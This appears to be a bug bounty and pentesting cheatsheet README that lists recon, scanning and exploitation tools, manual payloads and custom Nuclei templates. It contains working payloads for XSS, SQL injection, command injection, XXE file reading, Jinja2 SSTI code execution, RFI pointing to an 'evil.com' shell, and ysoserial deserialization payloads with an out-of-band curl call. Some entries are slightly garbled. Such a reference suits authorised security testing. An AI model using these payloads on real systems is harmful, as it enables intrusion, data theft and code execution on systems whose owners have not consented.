<pre>
                                                                                 
  _____                        _     ____  
 (_____)          ____  _     (_)_  (____) 
(_)___(_)  ____  (____)(_)__  (___)(_)  (_)
(_______) (____)(_)_(_)(____) (_)  (_)  (_)
(_)   (_)( )_(_)(__)__ (_) (_)(_)_ (_)__(_)
(_)   (_) (____) (____)(_) (_) (__) (____) 
         (_)_(_)                           
          (___)                                        
</pre>

# Advanced Bug Bounty & Pentesting Cheatsheet

This repository contains a comprehensive and advanced cheatsheet for bug bounty hunting and penetration testing. It covers the entire process from reconnaissance to reporting, with a focus on advanced techniques, automation, and custom templates to stay ahead of the curve.

**Disclaimer:** This cheatsheet is for educational purposes only. Only test on programs where you have explicit permission.

## Table of Contents

1.  [The Bug Hunter's Mindset](#the-bug-hunters-mindset)
2.  [Phase 1: Reconnaissance - The Foundation](#phase-1-reconnaissance---the-foundation)
    *   [1.1 Passive Reconnaissance](#11-passive-reconnaissance)
    *   [1.2 Active Reconnaissance](#12-active-reconnaissance)
3.  [Phase 2: Scanning & Enumeration](#phase-2-scanning--enumeration)
    *   [2.1 Service & Vulnerability Scanning](#21-service--vulnerability-scanning)
    *   [2.2 Web Content Discovery](#22-web-content-discovery)
4.  [Phase 3: Manual Vulnerability Analysis & Exploitation](#phase-3-manual-vulnerability-analysis--exploitation)
    *   [3.1 Cross-Site Scripting (XSS)](#31-cross-site-scripting-xss)
    *   [3.2 SQL Injection (SQLi)](#32-sql-injection-sqli)
    *   [3.3 Server-Side Request Forgery (SSRF)](#33-server-side-request-forgery-ssrf)
    *   [3.4 Insecure Direct Object References (IDOR)](#34-insecure-direct-object-references-idor)
    *   [3.5 Cross-Site Request Forgery (CSRF)](#35-cross-site-request-forgery-csrf)
    *   [3.6 Command Injection](#36-command-injection)
    *   [3.7 Local/Remote File Inclusion (LFI/RFI)](#37-localremote-file-inclusion-lfirfi)
    *   [3.8 Authentication & Authorization Bypass](#38-authentication--authorization-bypass)
    *   [3.9 API Security Testing (REST & GraphQL)](#39-api-security-testing-rest--graphql)
    *   [3.10 XXE (XML External Entity)](#310-xxe-xml-external-entity)
    *   [3.11 SSTI (Server-Side Template Injection)](#311-ssti-server-side-template-injection)
    *   [3.12 Race Conditions](#312-race-conditions)
    *   [3.13 Web Cache Poisoning](#313-web-cache-poisoning)
    *   [3.14 HTTP Request Smuggling](#314-http-request-smuggling)
    *   [3.15 Prototype Pollution](#315-prototype-pollution)
    *   [3.16 Insecure Deserialization](#316-insecure-deserialization)
    *   [3.17 Open Redirection](#317-open-redirection)
    *   [3.18 CORS (Cross-Origin Resource Sharing) Misconfigurations](#318-cors-cross-origin-resource-sharing-misconfigurations)
5.  [Phase 4: Reporting & Post-Engagement](#phase-4-reporting--post-engagement)
6.  [Essential Tools Arsenal](#essential-tools-arsenal)
7.  [Custom Nuclei Templates](#custom-nuclei-templates)

---

## The Bug Hunter's Mindset

Success in bug bounty hunting is not just about tools; it's a mindset.

*   **Be Curious:** Always ask "What if I do this?". Don't just follow a checklist.
*   **Be Persistent:** You will face many non-vulnerable applications. Persistence is key.
*   **Think Like a Developer:** Understand the application's logic to find flaws in it.
*   **Stay Updated:** The security landscape changes daily. Follow researchers on Twitter, read blogs, and attend conferences.
*   **Automate the Boring Stuff:** Automate reconnaissance and scanning to focus your energy on manual, in-depth testing.

---

## Phase 1: Reconnaissance - The Foundation

This is the most crucial phase. A wider scope during recon leads to more potential vulnerabilities. We will split this into passive and active recon.

### 1.1 Passive Reconnaissance

Gathering information without directly interacting with the target.

*   **WHOIS & IP History:**
    ```bash
    whois example.com
    ```
*   **Google Dorking (Advanced):**
    *   `site:example.com -www` - Find subdomains
    *   `site:example.com intitle:"index of"` - Directory listings
    *   `site:example.com inurl:login` - Login pages
    *   `site:example.com filetype:pdf` - Find PDF files
    *   `site:*.example.com` - All subdomains
    *   `site:example.com intext:"api_key"` - Find API keys
*   **GitHub Recon:**
    *   Search for the company's name or domain for leaked credentials or sensitive information.
    *   Use tools like `git-dumper` to download exposed `.git` directories.
*   **Shodan/Censys/BinaryEdge:** These are search engines for devices connected to the internet.
    *   **Shodan:**
        *   `hostname:.example.com`
        *   `org:"Example Inc."`
        *   `ssl:"example.com"`
        *   `http.favicon.hash:-335242539` (Finds Jenkins instances)
    *   **Censys:**
        *   `services.http.response.headers.server: "nginx" AND location.country_code: "US"`
        *   `parsed.names: example.com`
    *   **BinaryEdge:**
        *   `domain:example.com`
*   **Certificate Transparency:**
    *   [crt.sh](https://crt.sh/?q=example.com)
    *   [censys.io](https://censys.io/)
*   **Public Datasets:**
    *   Utilize datasets like the Common Crawl to find historical data about your target.
*   **ASN Discovery:** Find ASNs owned by the target to identify network ranges and associated IPs.
    ```bash
    # Get ASN from an IP
    whois $(dig +short example.com) | grep "OriginAS"

    # Get IP ranges from ASN
    whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+"
    ```
*   **Acquisition Recon:** Companies that have been acquired are often part of the scope. Use sources like [Crunchbase](https://www.crunchbase.com/) to identify them.

*   **GitHub/GitLab Recon (Advanced):**
    *   Use advanced search queries directly on GitHub: `"example.com" "api_key"`, `"example.com" "password"`.
    *   **Tools for automated secret finding:**
        *   **gitleaks:**
            ```bash
            # Installation
            go install github.com/zricethezav/gitleaks/v8@latest

            # Usage
            gitleaks detect --source /path/to/repo -v
            ```
        *   **trufflehog:**
            ```bash
            # Installation
            pip3 install trufflehog

            # Usage
            trufflehog git https://github.com/dxa4481/truffleHog.git
            ```
*   **Wayback Machine Analysis:** Discover old, forgotten endpoints and parameters.
    *   **Tools:**
        *   **gau (getallurls):**
            ```bash
            # Installation
            go install github.com/lc/gau/v2/cmd/gau@latest

            # Usage
            gau example.com --o wayback_urls.txt
            ```
        *   **waybackurls:**
            ```bash
            # Installation
            go install github.com/tomnomnom/waybackurls@latest

            # Usage
            waybackurls example.com > wayback_urls_2.txt
            ```

### 1.2 Active Reconnaissance

Directly interacting with the target to gather more information.

*   **Subdomain Enumeration:**
    *   **Subfinder:**
        ```bash
        # Installation
        go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

        # Usage
        subfinder -d example.com -o subdomains.txt
        ```
    *   **Amass:**
        ```bash
        # Installation
        go install -v github.com/owasp-amass/amass/v4/...@master

        # Usage (Passive)
        amass enum -passive -d example.com -o subdomains_amass.txt
        ```
    *   **Assetfinder:**
        ```bash
        # Installation
        go install github.com/tomnomnom/assetfinder@latest

        # Usage
        assetfinder --subs-only example.com > subdomains_assetfinder.txt
        ```
    *   **DNS Permutation with `dnsgen`:**
        ```bash
        # Installation
        pip3 install dnsgen

        # Usage (generates permutations from your subdomains list)
        cat all_subdomains.txt | dnsgen - > dns_permutations.txt
        ```
    *   **Combining Tools for Maximum Coverage:**
        ```bash
        # Combine results and find unique domains
        cat subdomains*.txt | sort -u > all_subdomains.txt
        ```
*   **Resolving & DNS Brute-Forcing:**
    *   A reliable resolver is crucial. Use a custom list or a tool like `puredns`.
    *   **puredns:**
        ```bash
        # Installation
        go install github.com/d3mondev/puredns/v2@latest

        # Usage (resolve and validate)
        puredns resolve all_subdomains.txt -r resolvers.txt -w resolved_hosts.txt
        ```
*   **Resolving Subdomains & Finding Live Hosts:**
    *   **httpx:**
        ```bash
        # Installation
        go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

        # Usage
        cat subdomains.txt | httpx -o live_hosts.txt
        ```
    *   **Probing for live hosts with `httprobe`:**
        ```bash
        # Installation
        go install github.com/tomnomnom/httprobe@latest

        # Usage
        cat live_hosts.txt | gowitness file -f - --screenshot-path screenshots/
        ```
*   **Port Scanning:**
    *   **Nmap:**
        ```bash
        # Fast scan on top 1000 ports
        nmap -T4 -F example.com

        # Service version detection on all ports
        nmap -sV -p- -T4 example.com
        ```
    *   **Naabu:**
        ```bash
        # Installation
        go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

        # Usage
        naabu -host example.com -top-ports 100 -o open_ports.txt
        ```
    *   **Masscan - The Fastest Port Scanner:**
        ```bash
        # Installation
        sudo apt-get install masscan

        # Usage - Scan a list of IPs for top ports
        masscan -p80,443,8080 -iL ip_list.txt
        ```
*   **Cloud Reconnaissance:**
    *   Many assets are hosted in the cloud. Look for storage buckets, cloud functions, etc.
    *   **Tools:**
        *   **Cloud enum:**
            ```bash
            # Installation
            pip3 install cloud-enum

            # Usage
            cloud_enum -k example
            ```
        *   **S3Scanner:**
            ```bash
            # Installation
            pip3 install s3scanner

            # Usage
            s3scanner -d bucket-list.txt
            ```
---

## Phase 2: Scanning & Enumeration

Now that we have a list of live hosts and open ports, we can start looking for low-hanging fruit and enumerate services.

### 2.1 Service & Vulnerability Scanning

*   **Nuclei - The Powerhouse:**
    ```bash
    # Installation
    go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

    # Basic Scan
    nuclei -u https://example.com

    # Scan a list of URLs
    nuclei -l live_hosts.txt

    # Use custom templates
    nuclei -l live_hosts.txt -t /path/to/custom/templates/
    ```
*   **Nikto - Web Server Scanner:**
    ```bash
    # Installation
    sudo apt-get install nikto

    # Usage
    nikto -h https://example.com
    ```

### 2.2 Web Content Discovery

*   **Directory & File Brute-forcing with `ffuf`:**
    ```bash
    # Installation
    go install github.com/ffuf/ffuf@latest

    # Usage
    ffuf -w /path/to/your/wordlist.txt -u https://example.com/FUZZ
    ```
    *   **Advanced `ffuf` usage:**
        *   Recursive scan: `ffuf -w wordlist.txt -u https://example.com/FUZZ -recursion`
        *   Filter results: `ffuf -w wordlist.txt -u https://example.com/FUZZ -fs <size>`
*   **Web Crawling to Find Endpoints:**
    *   **gospider:**
        ```bash
        # Installation
        go install github.com/jaeles-project/gospider@latest

        # Usage
        gospider -s "https://example.com" -o output -c 10 -d 5 --other-source
        ```
    *   **hakrawler:**
        ```bash
        # Installation
        go install github.com/hakluke/hakrawler@latest

        # Usage
        cat live_hosts.txt | hakrawler -d 2 -u
        ```
*   **JavaScript File Analysis:**
    *   JavaScript files often contain hidden API endpoints, credentials, and logic.
    *   **Tools:**
        *   **LinkFinder:**
            ```bash
            # Installation
            git clone https://github.com/GerbenJavado/LinkFinder.git
            pip3 install -r requirements.txt

            # Usage
            python3 linkfinder.py -i https://example.com/main.js -o cli
            ```
        *   **secretfinder:**
            ```bash
            # Installation
            git clone https://github.com/m4ll0k/SecretFinder.git
            pip3 install -r requirements.txt

            # Usage
            python3 SecretFinder.py -i https://example.com/main.js -o cli
            ```
        *   **JSScanner:**
            ```bash
            # Installation & Usage
            # Go to the website and paste the JS file URL
            ```
            [JSScanner Website](https://github.com/dark-warlord14/JSScanner)
*   **Parameter Discovery with `Arjun`:**
    ```bash
    # Installation
    pip3 install arjun

    # Usage
    arjun -u https://example.com
    ```
---

## Phase 3: Manual Vulnerability Analysis & Exploitation

Automation can only get you so far. This is where your skills come into play. Always use a proxy like Burp Suite or OWASP ZAP for manual testing.

### 3.1 Cross-Site Scripting (XSS)
*   **Reflected XSS:** Input is reflected on the page.
*   **Stored XSS:** Input is stored in the database and displayed to other users.
*   **DOM-based XSS:** Payload is executed in the DOM.
*   **Automated XSS Scanners:**
    *   **Dalfox:** A powerful, parameter-based XSS scanner.
        ```bash
        # Installation
        go install github.com/hahwul/dalfox/v2@latest

        # Usage from a URL
        dalfox url http://example.com/?p=1

        # Usage from a file of URLs, checking for stored XSS
        dalfox file urls.txt --stored
        ```
    *   **XSStrike:** An advanced XSS detection suite.
        ```bash
        # Installation
        git clone https://github.com/s0md3v/XSStrike.git
        pip3 install -r XSStrike/requirements.txt

        # Usage
        python3 XSStrike/xsstrike.py -u "http://example.com/search.php?q=test"
        ```
    *   **kxss:** A simple tool for finding XSS.
        ```bash
        # Installation
        go install github.com/Emoe/kxss@latest

        # Usage
        echo "http://example.com/search.php?q=test" | kxss
        ```
*   **Testing:**
    *   Inject `<script>alert(1)</script>` in every input field.
    *   Use different contexts: `<img src=x onerror=alert(1)>`, `"><svg onload=alert(1)>`.
    *   Bypass filters: Use `String.fromCharCode()` or other encoding.
    *   **Polyglot Payloads:**
        ```
        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
        ```

### 3.2 SQL Injection (SQLi)
*   **Testing:**
    *   `' OR 1=1 --`
    *   `' OR '1'='1`
    *   Time-based blind: ` ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --`
    *   **SQLMap - The Essential Tool:**
        ```bash
        # Basic scan
        sqlmap -u "https://example.com/vuln.php?id=1" --dbs

        # Advanced Usage: Crawl a site and test all forms
        sqlmap -u "https://example.com" --forms --batch --crawl=3

        # Test from a file of Burp logs
        sqlmap -r request.txt -p id --risk=3 --level=5
        ```
    *   **Ghauri:** A faster, time-based blind SQLi detection tool.
        ```bash
        # Installation
        pip3 install ghauri

        # Usage
        ghauri -u "http://example.com/product.php?id=1"
        ```

### 3.3 Server-Side Request Forgery (SSRF)
*   **Testing:**
    *   Look for parameters that take a URL: `?url=`, `?path=`, `?dest=`
    *   Try to access internal services: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254/latest/meta-data/` (for AWS).
    *   **Automated SSRF Detection:**
        *   **interactsh-client:** Use ProjectDiscovery's interaction server to detect out-of-band requests.
            ```bash
            # Installation
            go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

            # 1. Start the client
            interactsh-client

            # 2. Use the generated URL (e.g., xxx.oast.fun) in your SSRF payloads
            # Ex: https://example.com/?url=http://xxx.oast.fun
            ```
        *   **SSRFmap:** A dedicated SSRF exploitation tool.
            ```bash
            # Installation
            git clone https://github.com/swisskyrepo/SSRFmap
            pip3 install -r SSRFmap/requirements.txt

            # Usage
            python3 SSRFmap/ssrfmap.py -r data/request.txt -p url
            ```
    *   **Bypass techniques:**
        *   Use different IP encodings: `http://2130706433` (127.0.0.1), `http://0x7f000001`
        *   Use alternative URL schemes: `dict://`, `gopher://`
        *   Utilize DNS rebinding.

### 3.4 Insecure Direct Object References (IDOR)
*   **Testing:**
    *   Change IDs in the URL: `/profile/123` -> `/profile/124`
    *   Look for base64 encoded or hashed IDs and try to decode/crack them.
*   **Automated IDOR Discovery:**
    *   While IDORs are often logic-based, tools can help automate the hunt for vulnerable parameters.
    *   **Autorize:** A Burp Suite extension that helps detect authorization vulnerabilities by repeating requests with a lower-privileged user's session.
    *   **ffuf:** Use ffuf to enumerate for numeric IDs.
        ```bash
        # Fuzz for numeric IDs from 1 to 1000 on a user profile page
        ffuf -w /path/to/wordlist/1-1000.txt -u https://example.com/users/FUZZ -H "Cookie: session=..."
        ```

### 3.5 Cross-Site Request Forgery (CSRF)
*   **Testing:**
    *   Check if state-changing requests (e.g., changing email, password) lack anti-CSRF tokens.
    *   If tokens are present, see if they are validated correctly.
*   **Tool:** "Param Miner" Burp Suite extension is excellent for this.

### 3.6 Command Injection
*   **Testing:**
    *   `| id`, `&& id`, `; id`
    *   `$(id)`
    *   `ping -c 1 127.0.0.1; id`
*   **Automated Command Injection:**
    *   **commix:** A powerful, automated tool for command injection exploitation.
        ```bash
        # Installation
        git clone https://github.com/commixproject/commix.git
        cd commix

        # Usage
        python3 commix.py --url="http://example.com/cmd.php?cmd=id"

        # Test POST data
        python3 commix.py --url="http://example.com/cmd.php" --data="cmd=id"
        ```

### 3.7 Local/Remote File Inclusion (LFI/RFI)
*   **Testing:**
    *   `?file=../../../../etc/passwd`
    *   `?page=http://evil.com/shell.txt`
*   **Automated LFI/RFI:**
    *   **ffuf:** We can use `ffuf` with LFI wordlists to automate discovery.
        ```bash
        # Fuzzing for LFI with a wordlist of common files
        ffuf -w /path/to/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "https://example.com/?page=FUZZ"
        ```
*   **PHP Wrappers for LFI:**
        *   `php://filter/convert.base64-encode/resource=index.php`
        *   `zip://archive.zip#shell.php`

### 3.8 Authentication & Authorization Bypass
*   **Testing:**
    *   Force browsing to admin panels.
    *   Parameter tampering (e.g., `role=user` to `role=admin`).
    *   Test for weak password reset functionality.
*   **Testing:**
    *   Force browsing to admin panels.
    *   Parameter tampering (e.g., `role=user` to `role=admin`).
    *   Test for weak password reset functionality.

### 3.9 API Security Testing (REST & GraphQL)

*   **REST API Testing:**
    *   **Endpoint Discovery with `Kiterunner`:**
        ```bash
        # Installation
        # Download from https://github.com/assetnote/kiterunner/releases

        # Usage
        kr scan https://example.com -w /path/to/wordlist -A=apiroutes-210228
        ```
    *   **Common Vulnerabilities:**
        *   **IDORs on API endpoints:** `api/v1/users/123` -> `api/v1/users/124`
        *   **Mass Assignment:** Add parameters like `"isAdmin":true` to JSON requests.
        *   **Broken Object Level Authorization (BOLA):** Can you access resources of other users?
        *   **Rate Limiting:** Lack of rate limiting on login or OTP endpoints.

*   **GraphQL API Testing:**
    *   **Enable Introspection:** If enabled, it leaks the entire schema.
    *   **Tools:**
        *   **GraphQLmap:**
            ```bash
            # Installation
            git clone https://github.com/swisskyrepo/GraphQLmap.git

            # Usage
            python3 graphqlmap.py -u https://example.com/graphql -d
            ```
        *   **InQL:** Burp Suite extension for GraphQL testing.
    *   **Common Vulnerabilities:**
        *   **Denial of Service (DoS) via nested queries.**
        *   **Authorization bypasses in resolvers.**
    *   **clairvoyance:** A powerful GraphQL schema discovery tool.
        ```bash
        # Installation
        pip3 install clairvoyance

        # Usage
        clairvoyance https://example.com/graphql
        ```

### 3.10 XXE (XML External Entity)
*   **Testing:**
    *   If an endpoint accepts XML, try to inject an XXE payload.
    *   **Payload:**
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <foo>&xxe;</foo>
        ```

### 3.11 SSTI (Server-Side Template Injection)
*   **Testing:**
    *   Inject template syntax in input fields: `{{7*7}}`, `${7*7}`
    *   Use a decision tree to identify the template engine (e.g., Jinja2, Twig, Freemarker).
    *   **Payload (Jinja2):**
        ```
        {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
        ```
*   **Automated SSTI Detection:**
    *   **tplmap:** A tool for automating the detection and exploitation of SSTI.
        ```bash
        # Installation
        git clone https://github.com/epinna/tplmap.git
        cd tplmap
        pip install -r requirements.txt

        # Usage
        python2 tplmap.py -u "http://example.com/page?name=test"
        ```

### 3.12 Race Conditions
*   **Testing:**
    *   Identify functionality that has a time-of-check to time-of-use (TOCTOU) gap (e.g., applying a coupon, voting in a poll).
    *   Use tools like Burp Suite's "Turbo Intruder" to send multiple requests simultaneously.
    *   **Example:** Send multiple requests to redeem a coupon code at the same time to see if you can use it more than once.

### 3.13 Web Cache Poisoning
*   **Testing:**
    *   Identify unkeyed inputs (headers, cookies) that are reflected in the response.
    *   Send a request with a malicious value in an unkeyed header.
    *   If the response is cached, subsequent users will receive the poisoned version.
    *   **Tool:** "Param Miner" Burp Suite extension is excellent for this.

### 3.14 HTTP Request Smuggling
*   This vulnerability arises when the frontend (e.g., a load balancer) and the backend server interpret the boundary of an HTTP request differently.
*   **Automated Command-Line Tools:**
    *   **smuggler.py:** The go-to tool for detecting CL.TE and TE.CL vulnerabilities.
        ```bash
        # Installation
        git clone https://github.com/defparam/smuggler.git

        # Usage
        python3 smuggler/smuggler.py -u https://example.com/
        ```
    *   **http2smugl:** Focuses on detecting smuggling via HTTP/2 to HTTP/1.1 conversion.
        ```bash
        # Installation
        go install github.com/neex/http2smugl@latest

        # Usage
        http2smugl detect https://example.com/
        ```
*   **Testing:**
    *   Use Burp Suite's "HTTP Request Smuggler" extension.
    *   Look for differences in how `Content-Length` and `Transfer-Encoding` headers are handled.
*   **Impact:** Can lead to cache poisoning, session hijacking, and bypassing security controls.

### 3.15 Prototype Pollution
*   A JavaScript vulnerability where an attacker can modify an object's prototype. This can lead to arbitrary code execution or denial of service.
*   **Automated Detection:**
    *   **pp-finder:** A Burp Suite extension to find prototype pollution.
    *   **ppmap:** A command-line tool for identifying prototype pollution vulnerabilities.
        ```bash
        # Installation
        go install github.com/kleiton0x00/ppmap@latest

        # Usage
        cat urls.txt | ppmap
        ```
*   **Testing:**
    *   Look for unsafe recursive merge functions in JavaScript code.

### 3.16 Insecure Deserialization
*   This occurs when an application deserializes untrusted user input without proper validation, leading to remote code execution.
*   **Payload Generation Tools:**
    *   **ysoserial:** The ultimate tool for generating Java deserialization payloads.
        ```bash
        # Installation
        # Download the jar from https://github.com/frohoff/ysoserial

        # Usage - Generate a payload for the "CommonsCollections1" gadget
        java -jar ysoserial.jar CommonsCollections1 'curl http://x.oast.fun' > payload.bin
        # Then send the payload.bin in the request
        ```
    *   **PHPGGC:** A library of PHP unserialize() payloads.
        ```bash
        # Installation
        git clone https://github.com/ambionics/phpggc.git

        # Usage
        phpggc/phpggc monolog/rce1 system id
        ```
*   **Languages & Tools:**
    *   **Java:** Look for serialized objects in HTTP requests (often starting with `ac ed 00 05`). Use the `ysoserial` tool to generate payloads.

### 3.17 Open Redirection
*   Occurs when an application redirects users to a URL specified in a user-controlled parameter without proper validation.
*   **Automated Scanners:**
    *   **Oralyzer:** A powerful open redirection scanner.
        ```bash
        # Installation
        git clone https://github.com/r0075h3ll/Oralyzer.git
        pip3 install -r Oralyzer/requirements.txt

        # Usage
        python3 Oralyzer/oralyzer.py -u "https://example.com/?next=http://google.com"
        ```
    *   **OpenRediWrecked:** Uses a curated list of payloads.
        ```bash
        # Installation
        git clone https://github.com/blackhatethicalhacking/OpenRediWrecked.git
        cd OpenRediWrecked
        chmod +x OpenRediWrecked.sh

        # Usage
        ./OpenRediWrecked.sh
        ```

### 3.18 CORS (Cross-Origin Resource Sharing) Misconfigurations
*   Improperly configured CORS policies can allow malicious websites to make requests to a victim's domain and read the response.
*   **Automated Scanners:**
    *   **Corsy:** A classic CORS misconfiguration scanner.
        ```bash
        # Installation
        git clone https://github.com/s0md3v/Corsy.git
        pip3 install requests

        # Usage
        python3 Corsy/corsy.py -u https://example.com/api/user
        ```
    *   **CorsOne:** A modern and fast CORS discovery tool.
        ```bash
        # Installation
        git clone https://github.com/omranisecurity/CorsOne.git
        cd CorsOne
        python3 -m pip install -r requirements.txt

        # Usage
        python3 CorsOne.py -u https://example.com/api/user
        ```
    *   **ucors:** A go-based tool for finding CORS bypasses.
        ```bash
        # Installation
        go install github.com/wfinn/ucors@latest

        # Usage
        echo https://example.com/api/user | ucors -c "session=xyz123"
        ```

---

## Phase 4: Reporting & Post-Engagement

A good report is as important as finding the bug.

*   **Title:** Clear and concise (e.g., "Stored XSS on Profile Page").
*   **Vulnerability Details:** Explain the vulnerability and its impact.
*   **Steps to Reproduce:** Provide a clear, step-by-step guide.
*   **Proof of Concept (PoC):** Screenshots, code snippets, or a video.
*   **Remediation:** Suggest how to fix the vulnerability.

### GraphQL Introspection Query

```yaml
id: graphql-introspection-enabled

info:
  name: GraphQL Introspection Enabled
  author: YourName
  severity: info
  description: The GraphQL endpoint has introspection enabled, which could leak the schema.
  tags: graphql,exposure

http:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api"
      - "{{BaseURL}}/api/graphql"
    body: '{"query":"query {__schema {types {name}}}"}'
    headers:
      Content-Type: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "__schema"
          - "types"
          - "name"
        condition: and
```

---

## Automation & Chaining Tools

Chaining tools together is key to efficient bug hunting. Here is a sample bash script to automate initial recon.

```bash
#!/bin/bash

domain=$1
echo "Starting recon on $domain"

# Subdomain enumeration
echo "[+] Enumerating subdomains..."
subfinder -d $domain -o subdomains.txt
assetfinder --subs-only $domain >> subdomains.txt
amass enum -passive -d $domain >> subdomains.txt
sort -u subdomains.txt -o all_subdomains.txt

# Probing for live hosts
echo "[+] Probing for live hosts..."
cat all_subdomains.txt | httpx -o live_hosts.txt

# Scanning with Nuclei
echo "[+] Scanning with Nuclei..."
nuclei -l live_hosts.txt -t /path/to/your/nuclei-templates/ -o nuclei_results.txt

echo "Recon finished. Check the output files."
```

---

## Staying Ahead of the Curve

*   **Follow Security Researchers on Twitter:**
    *   @taviso
    *   @jobertabma
    *   @NahamSec
    *   @stokfredrik
    *   @Hacker0x01
*   **Read Security Blogs & News:**
    *   [PortSwigger Research](https://portswigger.net/research)
    *   [HackerOne Hacktivity](https://hackerone.com/hacktivity)
    *   [The Hacker News](https://thehackernews.com/)
    *   [Project Zero Blog](https://googleprojectzero.blogspot.com/)
*   **Attend Conferences (or watch the talks online):**
    *   DEF CON
    *   Black Hat
    *   AppSec EU/USA
*   [The Bug Hunter's Methodology (TBHM)](https://www.google.com/search?q=The+Bug+Hunter%27s+Methodology) - A great resource for learning the process.

---

## Wordlists and Payloads

Having high-quality wordlists for fuzzing, brute-forcing, and content discovery is essential.

*   **General Purpose:**
    *   [SecLists](https://github.com/danielmiessler/SecLists): The absolute gold standard for security testing wordlists.
    *   [fuzz.txt](https://github.com/Bo0oM/fuzz.txt): A massive collection of payloads for various vulnerability types.
    *   [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive list of payloads and bypasses for a huge range of vulnerabilities.
*   **Specialized Wordlists:**
    *   [Assetnote's Wordlists](https://wordlists.assetnote.io/): High-quality wordlists for content, discovery, and fuzzing from the pros at Assetnote.
    *   [fuzz4bounty](https://github.com/0xPugal/fuzz4bounty): A great collection of wordlists specifically curated for bug bounty hunting.
    *   [IntruderPayloads](https://github.com/1N3/IntruderPayloads): A collection of Burp Suite Intruder payloads for various attack types.
*   **GraphQL:**
    *   Use `clairvoyance` to generate target-specific wordlists from a GraphQL schema.
*   **Prototype Pollution:**
    *   [Prototype-Pollution-Gadgets](https://github.com/kleiton0x00/Prototype-Pollution-Gadgets): A list of known gadgets for prototype pollution.

---

## Bug Bounty One-Liners

Quick, powerful command chains to get results fast.

*   **Full Recon Chain (Subdomains, Live Hosts, Scanning):**
    ```bash
    subfinder -d example.com -silent | httpx -silent | nuclei -silent -t /path/to/templates/ -o results.txt
    ```
*   **Find JavaScript files and scan for secrets:**
    ```bash
    cat domains.txt | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript' | awk '{print $1}' | xargs -I@ bash -c 'python3 secretfinder.py -i @ -o cli'
    ```
*   **Crawl for params and test for XSS:**
    ```bash
    gau example.com | gf xss | kxss
    ```

---

## Essential Tools Arsenal

A list of must-have tools.

| Tool        | Category                  | Installation                               |
|-------------|---------------------------|--------------------------------------------|
| Burp Suite  | Intercepting Proxy        | [Download](https://portswigger.net/burp)   |
| OWASP ZAP   | Intercepting Proxy        | [Download](https://www.zaproxy.org/)       |
| Subfinder   | Subdomain Enumeration     | `go install -v ...`                        |
| httpx       | HTTP Toolkit              | `go install -v ...`                        |
| Nuclei      | Vulnerability Scanner     | `go install -v ...`                        |
| ffuf        | Fuzzer                    | `go install -v ...`                        |
| Nmap        | Port Scanner              | `sudo apt install nmap`                    |
| SQLMap      | SQLi Scanner              | `sudo apt install sqlmap`                  |
| Arjun       | Parameter Discovery       | `pip3 install arjun`                       |
| gowitness   | Visual Recon              | `go install ...`                           |
| Amass       | Subdomain Enumeration     | `go install -v ...`                        |
| gitleaks    | Secret Scanner            | `go install ...`                           |
| trufflehog  | Secret Scanner            | `pip3 install trufflehog`                  |
| dnsgen      | DNS Permutation           | `pip3 install dnsgen`                      |
| puredns     | DNS Resolver              | `go install ...`                           |
| cloud-enum  | Cloud Enumeration         | `pip3 install cloud-enum`                  |
| gospider    | Web Crawler               | `go install ...`                           |
| hakrawler   | Web Crawler               | `go install ...`                           |
| commix      | Command Injection         | `git clone ...`                            |
| tplmap      | SSTI Scanner              | `git clone ...`                            |
| Dalfox      | XSS Scanner               | `go install ...`                           |
| XSStrike    | XSS Scanner               | `git clone ...`                            |
| kxss        | XSS Scanner               | `go install ...`                           |
| Ghauri      | SQLi Scanner              | `pip3 install ghauri`                      |
| SSRFmap     | SSRF Exploitation         | `git clone ...`                            |
| subjack     | Subdomain Takeover        | `go install ...`                           |
| clairvoyance| GraphQL Scanner           | `pip3 install clairvoyance`                |
| Oralyzer    | Open Redirection          | `git clone ...`                            |
| Corsy       | CORS Scanner              | `git clone ...`                            |
| smuggler.py | HTTP Request Smuggling    | `git clone ...`                            |
| ysoserial   | Deserialization Payloads  | `wget ...`                                 |
| ppmap       | Prototype Pollution       | `go install ...`                           |

---

## Custom Nuclei Templates

Here are a few examples of custom Nuclei templates. Create a folder named `custom-templates` and save them there.

### Exposed `.git` Directory

```yaml
id: exposed-git-directory

info:
  name: Exposed .git Directory
  author: YourName
  severity: high
  description: The .git directory is publicly accessible.
  tags: config,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "[core]"
          - "repositoryformatversion"
        condition: and
```

### Exposed `.env` File

```yaml
id: exposed-env-file

info:
  name: Exposed .env File
  author: YourName
  severity: critical
  description: The .env file is publicly accessible.
  tags: config,exposure,credentials

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "APP_KEY="
          - "DB_HOST="
        condition: or
```

### Subdomain Takeover

```yaml
id: subdomain-takeover

info:
  name: Subdomain Takeover
  author: YourName
  severity: critical
  description: A subdomain points to a service (e.g., S3, GitHub Pages) but the resource has been removed.
  tags: misconfig,takeover

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        words:
          - "The specified bucket does not exist" # S3
          - "There isn't a GitHub Pages site here." # GitHub Pages
          - "NoSuchBucket"
        condition: or
```

